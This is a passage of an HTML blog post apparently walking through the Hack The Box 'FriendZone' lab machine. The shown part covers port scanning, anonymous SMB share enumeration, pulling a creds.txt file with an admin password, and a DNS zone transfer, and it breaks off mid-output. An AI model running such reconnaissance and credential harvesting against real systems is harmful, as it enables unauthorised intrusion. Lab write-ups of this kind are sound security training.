@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="FriendZoneDifficulty: Medium +Score: 6.5&#x2F;10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-FriendZone">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[13].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="FriendZoneDifficulty: Medium +Score: 6.5&#x2F;10">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Flwc9T-wnVl3B26E43gu5GatDa8b.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjlffnZpcrdFOQ3eox0HtmmBTq-5.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhooceg4Wq5T6CyW1JHIUCRmpTr6.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoKNaZw0JiTha8Snlmjh2EJ4AY7c.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs1pB9AbVSVfzsoVgQ-LoCRzRhkI.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqZcPr_LDoBCtleLzNsraIQhRIGE.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjgkZT0jBVW7wHOFiu0cS4UQMG2d.png">
+<meta property="article:published_time" content="2022-02-12T23:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:13.234Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Hack the Box">
+<meta property="article:tag" content="Penetration Test">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Flwc9T-wnVl3B26E43gu5GatDa8b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-FriendZone</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%20%5B14%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B12%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[13].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&text=HTB-FriendZone"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&is_video=false&description=HTB-FriendZone"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-FriendZone&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[13].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&title=HTB-FriendZone"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[13].html&name=HTB-FriendZone&description=&lt;h1 id=&#34;FriendZone&#34;&gt;&lt;a href=&#34;#FriendZone&#34; class=&#34;headerlink&#34; title=&#34;FriendZone&#34;&gt;&lt;/a&gt;FriendZone&lt;/h1&gt;&lt;p&gt;Difficulty: Medium +&lt;br&gt;Score: 6.5&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[13].html&t=HTB-FriendZone"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FriendZone"><span class="toc-number">1.</span> <span class="toc-text">FriendZone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scan"><span class="toc-number">3.1.</span> <span class="toc-text">Port Scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Service"><span class="toc-number">3.2.</span> <span class="toc-text">SMB Service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Zone-Transfer"><span class="toc-number">3.3.</span> <span class="toc-text">DNS Zone Transfer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-file-inclusion"><span class="toc-number">3.4.</span> <span class="toc-text">Local file inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pagename"><span class="toc-number">3.4.0.1.</span> <span class="toc-text">pagename</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Read-PHP-Source"><span class="toc-number">3.4.1.</span> <span class="toc-text">Read PHP Source</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-www-data-shell"><span class="toc-number">3.5.</span> <span class="toc-text">Get www-data shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privesc-to-root"><span class="toc-number">3.6.</span> <span class="toc-text">Privesc to root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OS-file-is-writable"><span class="toc-number">3.6.1.</span> <span class="toc-text">OS file is writable</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-FriendZone
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-02-12T23:18:00.000Z" class="dt-published" itemprop="datePublished">2022-02-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-the-Box/" rel="tag">Hack the Box</a>, <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="FriendZone"><a href="#FriendZone" class="headerlink" title="FriendZone"></a>FriendZone</h1><p>Difficulty: Medium +<br>Score: 6.5&#x2F;10</p>
+<hr>
+<span id="more"></span>
+
+<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><ol>
+<li>2 flags</li>
+</ol>
+<h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><h2 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h2><p>Lots of ports open, including FTP (21), SSH (22), DNS (53), HTTP (80), HTTPS (443), and SMB (139&#x2F;445):</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p- <span class="token parameter variable">-sS</span> --min-rate<span class="token operator">=</span><span class="token number">10000</span> <span class="token number">10.10</span>.10.123
+<span class="token function">sudo</span> nmap <span class="token parameter variable">-p</span> <span class="token number">21,22</span>,53,80,443,139,445 <span class="token parameter variable">-A</span> --min-rate<span class="token operator">=</span><span class="token number">10000</span> <span class="token number">10.10</span>.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2019</span>-02-11 <span class="token number">16</span>:55 EST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.123
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.017s latency<span class="token punctuation">)</span>.
+PORT    STATE  SERVICE     VERSION
+<span class="token number">21</span>/tcp  <span class="token function">open</span>   <span class="token function">ftp</span>         vsftpd <span class="token number">3.0</span>.3
+<span class="token number">22</span>/tcp  <span class="token function">open</span>   <span class="token function">ssh</span>         OpenSSH <span class="token number">7</span>.6p1 Ubuntu <span class="token number">4</span> <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey:
+<span class="token operator">|</span>   <span class="token number">2048</span> a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">53</span>/tcp  <span class="token function">open</span>   domain      ISC BIND <span class="token number">9.11</span>.3-1ubuntu1.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">)</span>
+<span class="token operator">|</span> dns-nsid:
+<span class="token operator">|</span>_  bind.version: <span class="token number">9.11</span>.3-1ubuntu1.2-Ubuntu
+<span class="token number">80</span>/tcp  <span class="token function">open</span>   http        Apache httpd <span class="token number">2.4</span>.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-server-header: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Friend Zone Escape software
+<span class="token number">137</span>/tcp closed netbios-ns
+<span class="token number">139</span>/tcp <span class="token function">open</span>   netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
+<span class="token number">443</span>/tcp <span class="token function">open</span>   ssl/http    Apache httpd <span class="token number">2.4</span>.29
+<span class="token operator">|</span>_http-server-header: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: <span class="token number">404</span> Not Found
+<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>friendzone.red/organizationName<span class="token operator">=</span>CODERED/stateOrProvinceName<span class="token operator">=</span>CODERED/countryName<span class="token operator">=</span>JO
+<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-10-05T21:02:30
+<span class="token operator">|</span>_Not valid after:  <span class="token number">2018</span>-11-04T21:02:30
+<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
+<span class="token operator">|</span> tls-alpn:
+<span class="token operator">|</span>_  http/1.1
+<span class="token number">445</span>/tcp <span class="token function">open</span>   netbios-ssn Samba smbd <span class="token number">4.7</span>.6-Ubuntu <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
+Service Info: Hosts: FRIENDZONE, <span class="token number">127.0</span>.0.1<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+Host script results:
+<span class="token operator">|</span>_clock-skew: mean: -48m13s, deviation: 1h09m16s, median: <span class="token parameter variable">-8m14s</span>
+<span class="token operator">|</span>_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: <span class="token operator">&lt;</span>unknown<span class="token operator">></span> <span class="token punctuation">(</span>unknown<span class="token punctuation">)</span>
+<span class="token operator">|</span> smb-os-discovery:
+<span class="token operator">|</span>   OS: Windows <span class="token number">6.1</span> <span class="token punctuation">(</span>Samba <span class="token number">4.7</span>.6-Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>   Computer name: friendzone
+<span class="token operator">|</span>   NetBIOS computer name: FRIENDZONE<span class="token punctuation">\</span>x00
+<span class="token operator">|</span>   Domain name: <span class="token punctuation">\</span>x00
+<span class="token operator">|</span>   FQDN: friendzone
+<span class="token operator">|</span>_  System time: <span class="token number">2019</span>-02-11T23:47:26+02:00
+<span class="token operator">|</span> smb-security-mode:
+<span class="token operator">|</span>   account_used: guest
+<span class="token operator">|</span>   authentication_level: user
+<span class="token operator">|</span>   challenge_response: supported
+<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
+<span class="token operator">|</span> smb2-security-mode:
+<span class="token operator">|</span>   <span class="token number">2.02</span>:
+<span class="token operator">|</span>_    Message signing enabled but not required
+<span class="token operator">|</span> smb2-time:
+<span class="token operator">|</span>   date: <span class="token number">2019</span>-02-11 <span class="token number">16</span>:47:26
+<span class="token operator">|</span>_  start_date: N/A
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">43.81</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="SMB-Service"><a href="#SMB-Service" class="headerlink" title="SMB Service"></a>SMB Service</h2><p>I’ll go to <code>smbmap</code> for a quick look at the shares and my permissions:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbmap <span class="token parameter variable">-H</span> <span class="token number">10.10</span>.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finding <span class="token function">open</span> SMB ports<span class="token punctuation">..</span><span class="token punctuation">..</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Guest SMB session established on <span class="token number">10.10</span>.10.123<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">10.10</span>.10.123:445        Name: friendzone.red
+        Disk                                                    Permissions
+        ----                                                    -----------
+        print$                                                  NO ACCESS
+        Files                                                   NO ACCESS
+        general                                                 READ ONLY
+        Development                                             READ, WRITE
+        IPC$                                                    NO ACCESS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I can get a similar list (without Permissions) from <code>smbclient</code> using <code>-N</code> for null session (or no auth) and <code>-L</code> to list:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-N</span> <span class="token parameter variable">-L</span> //10.10.10.123
+Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        Files           Disk      FriendZone Samba Server Files /etc/Files
+        general         Disk      FriendZone Samba Server Files
+        Development     Disk      FriendZone Samba Server Files
+        IPC$            IPC       IPC Service <span class="token punctuation">(</span>FriendZone server <span class="token punctuation">(</span>Samba, Ubuntu<span class="token punctuation">))</span>
+Reconnecting with SMB1 <span class="token keyword">for</span> workgroup listing.
+        Server               Comment
+        ---------            -------
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            FROLIC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It’s interesting to see the comment on <code>Files</code> as <code>/etc/Files</code>. I can guess that perhaps <code>general</code> and <code>Development</code> follow the same pattern. But I don’t have to guess, as there’s one more thing that’s particularly useful here - the <code>nmap</code> script, <code>smb-enum-shares.nse</code>.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--script</span> smb-enum-shares.nse <span class="token parameter variable">-p445</span> <span class="token number">10.10</span>.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> friendzone.red <span class="token punctuation">(</span><span class="token number">10.10</span>.10.123<span class="token punctuation">)</span>
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.017s latency<span class="token punctuation">)</span>.
+PORT    STATE SERVICE
+<span class="token number">445</span>/tcp <span class="token function">open</span>  microsoft-ds
+Host script results:
+<span class="token operator">|</span> smb-enum-shares:
+<span class="token operator">|</span>   account_used: guest
+<span class="token operator">|</span>   <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.10.123<span class="token punctuation">\</span>Development:
+<span class="token operator">|</span>     Type: STYPE_DISKTREE
+<span class="token operator">|</span>     Comment: FriendZone Samba Server Files
+<span class="token operator">|</span>     Users: <span class="token number">1</span>
+<span class="token operator">|</span>     Max Users: <span class="token operator">&lt;</span>unlimited<span class="token operator">></span>
+<span class="token operator">|</span>     Path: C:<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>Development
+<span class="token operator">|</span>     Anonymous access: READ/WRITE
+<span class="token operator">|</span>     Current user access: READ/WRITE
+<span class="token operator">|</span>   <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.10.123<span class="token punctuation">\</span>Files:
+<span class="token operator">|</span>     Type: STYPE_DISKTREE
+<span class="token operator">|</span>     Comment: FriendZone Samba Server Files /etc/Files
+<span class="token operator">|</span>     Users: <span class="token number">0</span>
+<span class="token operator">|</span>     Max Users: <span class="token operator">&lt;</span>unlimited<span class="token operator">></span>
+<span class="token operator">|</span>     Path: C:<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hole
+<span class="token operator">|</span>     Anonymous access: <span class="token operator">&lt;</span>none<span class="token operator">></span>
+<span class="token operator">|</span>     Current user access: <span class="token operator">&lt;</span>none<span class="token operator">></span>
+<span class="token operator">|</span>   <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.10.123<span class="token punctuation">\</span>IPC$:
+<span class="token operator">|</span>     Type: STYPE_IPC_HIDDEN
+<span class="token operator">|</span>     Comment: IPC Service <span class="token punctuation">(</span>FriendZone server <span class="token punctuation">(</span>Samba, Ubuntu<span class="token punctuation">))</span>
+<span class="token operator">|</span>     Users: <span class="token number">1</span>
+<span class="token operator">|</span>     Max Users: <span class="token operator">&lt;</span>unlimited<span class="token operator">></span>
+<span class="token operator">|</span>     Path: C:<span class="token punctuation">\</span>tmp
+<span class="token operator">|</span>     Anonymous access: READ/WRITE
+<span class="token operator">|</span>     Current user access: READ/WRITE
+<span class="token operator">|</span>   <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.10.123<span class="token punctuation">\</span>general:
+<span class="token operator">|</span>     Type: STYPE_DISKTREE
+<span class="token operator">|</span>     Comment: FriendZone Samba Server Files
+<span class="token operator">|</span>     Users: <span class="token number">0</span>
+<span class="token operator">|</span>     Max Users: <span class="token operator">&lt;</span>unlimited<span class="token operator">></span>
+<span class="token operator">|</span>     Path: C:<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>general
+<span class="token operator">|</span>     Anonymous access: READ/WRITE
+<span class="token operator">|</span>     Current user access: READ/WRITE
+<span class="token operator">|</span>   <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.10.123<span class="token punctuation">\</span>print$:
+<span class="token operator">|</span>     Type: STYPE_DISKTREE
+<span class="token operator">|</span>     Comment: Printer Drivers
+<span class="token operator">|</span>     Users: <span class="token number">0</span>
+<span class="token operator">|</span>     Max Users: <span class="token operator">&lt;</span>unlimited<span class="token operator">></span>
+<span class="token operator">|</span>     Path: C:<span class="token punctuation">\</span>var<span class="token punctuation">\</span>lib<span class="token punctuation">\</span>samba<span class="token punctuation">\</span>printers
+<span class="token operator">|</span>     Anonymous access: <span class="token operator">&lt;</span>none<span class="token operator">></span>
+<span class="token operator">|</span>_    Current user access: <span class="token operator">&lt;</span>none<span class="token operator">></span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">5.62</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The general share has a single file, but it looks like it’ll be useful:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-N</span> //10.10.10.123/general
+Try <span class="token string">"help"</span> to get a list of possible commands.
+smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
+  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Wed Jan <span class="token number">16</span> <span class="token number">15</span>:10:51 <span class="token number">2019</span>
+  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Sun Feb <span class="token number">10</span> <span class="token number">20</span>:46:10 <span class="token number">2019</span>
+  creds.txt                           N       <span class="token number">57</span>  Tue Oct  <span class="token number">9</span> <span class="token number">19</span>:52:42 <span class="token number">2018</span>
+                <span class="token number">9221460</span> blocks of size <span class="token number">1024</span>. <span class="token number">5795120</span> blocks available
+smb: <span class="token punctuation">\</span><span class="token operator">></span> get creds.txt
+getting <span class="token function">file</span> <span class="token punctuation">\</span>creds.txt of size <span class="token number">57</span> as creds.txt <span class="token punctuation">(</span><span class="token number">0.7</span> KiloBytes/sec<span class="token punctuation">)</span> <span class="token punctuation">(</span>average <span class="token number">0.7</span> KiloBytes/sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> creds.txt
+creds <span class="token keyword">for</span> the admin THING:
+admin:WORKWORKHhallelujah@<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="DNS-Zone-Transfer"><a href="#DNS-Zone-Transfer" class="headerlink" title="DNS Zone Transfer"></a>DNS Zone Transfer</h2><p>TCP is only used in DNS when the response size is greater than 512 bytes. Typically this is associated with Zone Transfers, where the server give all the information it has for a domain. There’s a few things I could try to enumerate DNS, but the fact that the host is listening on TCP 53 suggests the first thing I should try is a Zone Transfer.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dig</span> axfr friendzone.red @10.10.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>Kelpie💀Banshee<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/opt/HTB/FriendZone<span class="token punctuation">]</span>
+└─$ <span class="token function">dig</span> axfr friendzone.red @10.10.10.123
+<span class="token punctuation">;</span> <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> DiG <span class="token number">9.18</span>.0-2-Debian <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> axfr friendzone.red @10.10.10.123
+<span class="token punctuation">;</span><span class="token punctuation">;</span> global options: +cmd
+friendzone.red.         <span class="token number">604800</span>  IN      SOA     localhost. root.localhost. <span class="token number">2</span> <span class="token number">604800</span> <span class="token number">86400</span> <span class="token number">2419200</span> <span class="token number">604800</span>
+friendzone.red.         <span class="token number">604800</span>  IN      AAAA    ::1
+friendzone.red.         <span class="token number">604800</span>  IN      NS      localhost.
+friendzone.red.         <span class="token number">604800</span>  IN      A       <span class="token number">127.0</span>.0.1
+administrator1.friendzone.red. <span class="token number">604800</span> IN A      <span class="token number">127.0</span>.0.1
+hr.friendzone.red.      <span class="token number">604800</span>  IN      A       <span class="token number">127.0</span>.0.1
+uploads.friendzone.red. <span class="token number">604800</span>  IN      A       <span class="token number">127.0</span>.0.1
+friendzone.red.         <span class="token number">604800</span>  IN      SOA     localhost. root.localhost. <span class="token number">2</span> <span class="token number">604800</span> <span class="token number">86400</span> <span class="token number">2419200</span> <span class="token number">604800</span>
+<span class="token punctuation">;</span><span class="token punctuation">;</span> Query time: <span class="token number">256</span> msec
+<span class="token punctuation">;</span><span class="token punctuation">;</span> SERVER: <span class="token number">10.10</span>.10.123<span class="token comment">#53(10.10.10.123) (TCP)</span>
